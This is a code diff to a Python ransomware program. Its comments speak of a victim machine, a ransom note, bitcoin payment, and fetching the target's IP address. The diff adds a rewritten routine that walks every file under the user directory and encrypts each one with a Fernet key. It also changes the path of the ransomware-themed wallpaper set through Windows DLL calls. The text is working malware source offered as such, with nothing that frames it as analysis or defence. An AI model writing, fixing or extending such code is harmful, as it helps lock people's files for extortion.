@@ -2,7 +2,6 @@
 import os
 import webbrowser  # to load browser to go to specific website eg bitcoin
 import ctypes  # so we can interact with windows dlls and change windows background etc
-import urllib.request  # used for downloading and saving background image
 import requests  # used to make get reqeust to api.ipify.org to get target machine ip addr
 import time  # used to time.sleep interval for ransom note & check desktop to decrypt system/files
 import datetime  # to give time limit on ransom note
@@ -119,7 +118,7 @@ class RansomWare:
 
     # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system using the symmetric key that was generated on
     # victim machine
-    def crypt_system(self, encrypted=False):
+    def crypt_system_new(self, encrypted=False):
         system = os.walk(self.localRoot, topdown=True)
         for root, dir, files in system:
             for file in files:
@@ -131,6 +130,18 @@ class RansomWare:
                     self.crypt_file(file_path)
                 else:
                     self.crypt_file(file_path, encrypted=True)
+
+    def crypt_system(self, encrypted=False):
+        # Walk through all directories and files in C:\Users
+        for root, dirs, files in os.walk(self.localRoot, topdown=True):
+            for file in files:
+                file_path = os.path.join(root, file)
+                # Optionally, you can add a condition to filter files
+                # Encrypt or decrypt the file
+                try:
+                    self.crypt_file(file_path, encrypted)
+                except Exception as e:
+                    print(f"Error encrypting {file_path}: {e}")
 
     @staticmethod
     def what_is_bitcoin():
@@ -200,8 +211,9 @@ class RansomWare:
         imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876' \
                    '-100749983-large.jpg'
         # Go to specif url and download+save image using absolute path
-        path = r"C:\Users\Maaz\Documents\Python-Ransomware\bot.jpg"
-        urllib.request.urlretrieve(imageUrl, path)
+        # path = r"C:\Users\Maaz\Documents\Python-Ransomware\bot.jpg"
+        path = f"{DESKTOP_PATH}\\{PROJECT_NAME}" + r'\bot.jpg'
+
         SPI_SETDESKWALLPAPER = 20
         # Access windows dlls for functionality eg, changing desktop wallpaper
         ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
